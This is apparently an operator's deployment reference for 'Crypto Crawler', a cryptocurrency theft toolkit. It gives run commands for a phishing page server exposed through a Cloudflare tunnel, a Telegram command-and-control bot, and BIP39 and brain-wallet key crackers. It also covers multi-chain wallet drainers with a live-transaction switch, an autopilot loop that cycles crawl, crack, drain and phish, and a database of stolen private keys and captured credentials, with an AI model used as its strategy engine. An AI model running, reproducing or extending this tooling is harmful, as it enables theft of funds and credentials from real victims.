# Crypto Crawler Deployment Reference

Project root: `/media/kubuntux/DEVELOPMENT1/crypto_crawler/`
Python: `./venv/bin/python3`

## Running Services

| Service | Port | Start Command |
|---------|------|---------------|
| Phishing server | 8444 | `uvicorn phishing.page_server:app --host 0.0.0.0 --port 8444` |
| Monitor dashboard | 9000 | `uvicorn monitor:app --host 0.0.0.0 --port 9000` |
| C2 Telegram bot | - | `python3 -c "from remote.c2_bot import C2Bot; C2Bot().start_polling()"` |
| Continuous cracker | - | `python3 ai_agent/continuous_cracker.py` |
| Autopilot | - | `python3 autopilot.py` (crawl->crack->scan->drain->phish every 10min) |
| Cloudflare tunnel | - | `cloudflared tunnel --url http://localhost:8444` |

## Config

`config.json` controls:
- `drain.dry_run` — false = live transactions
- `target_wallets` — BTC/ETH/BSC/SOL/DOGE destination addresses
- `c2.telegram_token` — Telegram bot token
- `ai_agent.api_key` — DeepSeek API key

## API Keys (in `.env`)

- `DEEPSEEK_API_KEY` — AI strategy engine
- `TELEGRAM_BOT_TOKEN` — C2 bot
- `OPENROUTER_API_KEY` — LLM routing fallback

## Database

`output/crawler.db` — SQLite with tables:
- `wallets` — addresses, chains, balances, private keys
- `keys` — leaked private keys with sources
- `campaigns` — phishing campaign records
- `captures` — submitted credentials

## Key Files

- `ai_agent/continuous_cracker.py` — background BIP39 + sequential cracker
- `ai_agent/brain.py` — AI orchestration brain
- `drainer/drain_scheduler.py` — multi-chain drain orchestrator
- `phishing/page_server.py` — FastAPI phishing page server
- `phishing/template_generator.py` — phishing HTML generator
- `scanner/super_cracker.py` — 8-core parallel weak key scanner
- `scanner/key_cracker.py` — BIP39 derivation + brain wallet
- `drainer/smart_contract_drain.py` — Uniswap V2/V3 token drain

## Useful Commands

```bash
# Run one drain cycle
./venv/bin/python3 -c "from drainer.drain_scheduler import DrainScheduler; import json; print(json.dumps(DrainScheduler().run_drain_cycle(), indent=2))"

# Check live wallet balance
./venv/bin/python3 -c "from chain_handlers.eth_handler import ETHHandler; h=ETHHandler(); print(h.get_balance('0x...'))"

# Check DB
sqlite3 output/crawler.db "SELECT COUNT(*) FROM wallets WHERE balance_usd > 0"

# Start cloudflare tunnel
cloudflared tunnel --url http://localhost:8444
```
